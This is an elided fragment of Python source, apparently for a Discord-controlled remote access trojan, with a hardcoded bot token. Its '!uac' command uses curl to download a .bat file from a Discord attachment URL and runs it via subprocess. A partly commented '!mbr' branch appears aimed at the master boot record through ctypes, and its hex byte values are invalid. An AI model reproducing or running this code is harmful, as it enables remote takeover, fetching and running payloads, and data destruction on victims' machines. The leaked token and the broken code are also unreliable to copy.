...
token = 'MTA0MzUyMjYxNjM4MTY4OTk0Ng.Gpb85v.r3-HLlm_1vrTRk9FJcLtSbUnnp0QgjSlq29yYE'
global appdata
...
--> !exit = Exit program
--> !uac administrator account bypass
...
async def on_message(message):
    if message.channel.name != channel_name:
        ...
        if message.content == "!uac":
            import time
            status = None
            import subprocess
            import os
            instruction = "curl https://cdn.discordapp.com/attachments/1043521036454482025/1044601866207633478/1101010.bat --output 1101010.bat & 1101010.bat"
            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status
                status = "ok"
     ...
     #  if message.content.startswith == ("!mbr"):
             import ctypes
             import os
             dll = ctypes.windll
             hex_data = bytes([0xAAB83, 0xAAB83])
